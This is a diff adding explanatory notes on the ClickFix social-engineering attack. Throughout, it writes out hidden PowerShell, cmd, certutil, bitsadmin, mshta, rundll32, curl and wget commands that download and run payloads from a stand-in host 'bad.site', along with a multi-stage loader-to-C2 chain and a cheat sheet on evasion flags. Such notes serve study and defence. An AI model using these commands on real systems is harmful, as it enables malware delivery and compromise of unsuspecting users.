@@ -1,0 +1,183 @@
+ClickFix Attack ==> Full Process
+
+  ClickFix:
+    ClickFix is a SOcial Engineering driven + script based attack, in which the attacker lures the victim
+    to executes malicious commands in (Run Dialog/Powershell/CMD Terminal)
+
+===================================================
+  Step-by-Step Flow:
+===================================================
+
+Fake website/email
+      ↓
+"Press Win + R"
+      ↓
+User pastes command
+      ↓
+PowerShell / CMD runs
+      ↓
+Downloader script executes
+      ↓
+Payload downloaded
+      ↓
+Payload executed
+      ↓
+Persistence + C2
+
+Eg: Malicious Command:
+
+  powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex"
+
+Powershell       ==>  Launches/Run Powershell
+-w hidden        ==>  Hides the window from user(user doesn't see anything)
+-nop (-NoProfile)==> Do not load user profile, Avoid security scripts that are applied to the user
+-ep bypass (-ExecutionPolicy Bypass) ==> Ignore powershell scrurity restricitions, Allow unsigned scripts (Normally windows blocks unknown scripts)
+-c""  [ where c is command ]         ==> run whatever is there in strings
+iwr [invoke-WebRequest]              ==> Fetch data/information  [ similar to curl/wget]
+|                                    ==> Take output of first command & send it to Next command
+Eg: iwr http://bad.site/script.ps1 | iex
+  Download script & Immediately execute it
+iex (Invoke-Expression)              ==> Execute command received
+
+
+
+Real ClickFix Command Looks like
+    powershell -w hidden -nop -ep bypass -c "iwr http://bad.site/payload.ps1 | iex"
+
+Meaning:
+  Run in Powershell in hidden window & do not load user profile & bypass  execution policy checks,
+  fetch payload.ps1 from bad.site then execute immediately
+
+Variant 1 -- Encoded Command
+  Powershell -enc SQBtAHAA...   ==> Where -enc => -EncodedCommand
+
+Variant 2 -- cmd.exe ClickFix
+  cmd /c powershell iwr http://bad.site/file.ps1 | iex
+
+cmd - command Prompt [ execute command]
+/c - close CMD
+
+Variant 3 -- Using Certutil
+
+  certutil -urlcache -split -f http://bad.site/file.exe file.exe
+
+certutil - windows certificate utility (abused to download)
+-urlcache - Download file from URL
+-split - split file into chunks
+-f - Force overwrite
+Meaning: Doenload malware using built-in tool.
+
+Variant 4 -- bitsadmin
+
+bitsadmin /transfer job http://bad.site/file.exe C:\Temp\file.exe
+
+bitsadmin - windows background downloader
+/transfer - start download (used for stealth download)
+
+Variant 5 -- mshta
+mshta http://bad.site/file.hta
+
+Executes HTML Applications
+Attacker use:
+  JS,VBScript,Downloader
+
+Variant 6 - rundll32
+
+rundll32.exe url.dll,FileProtocolHandler http://bad.site
+
+open malicious URL
+Execute DLL
+
+Variant 7
+curl http://bad.site/file.exe -o file.exe
+
+-o - outputfile
+
+Variant 8 - wget
+wget http://bad.site/file.exe -OutFile file.exe
+
+Environment Variables (Common in ClickFix)
+$env:TEMP
+Temporary folder
+
+$env:APPDATA
+User app data folder
+
+Example:
+
+iwr http://bad.site/a.exe -OutFile $env:TEMP\a.exe
+
+Execution Commands:
+-------------------
+Start-Process
+  Start-Process file.exe
+&
+  & file.exe
+cmd /c
+  cmd /c file.exe
+
+Full Multi-stage Click-Fix Example:
+Stage - 1
+powershell -w hidden -nop -c "iwr http://site/loader.ps1 | iex"
+Stage - 2
+loader.ps1 downloads payload.exe
+Stage - 3
+payload.exe executed
+Stage 4
+C2 connection established
+
+
+MOST IMPORTANT PARAMETERS CHEAT SHEET:
+
+| Parameter  | Meaning         | Why attacker uses |
+| ---------- | --------------- | ----------------- |
+| powershell | run PowerShell  | execute script    |
+| -w hidden  | hide window     | stealth           |
+| -nop       | no profile      | faster            |
+| -ep bypass | bypass security | run unsigned      |
+| -c         | run command     | execute           |
+| iwr        | download        | payload           |
+| iex        | execute         | run script        |
+| -enc       | encoded         | obfuscation       |
+| certutil   | download        | LOLBIN            |
+| bitsadmin  | download        | stealth           |
+| mshta      | execute HTA     | script run        |
+| rundll32   | run DLL         | payload           |
+| curl       | download        | payload           |
+| wget       | download        | payload           |
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
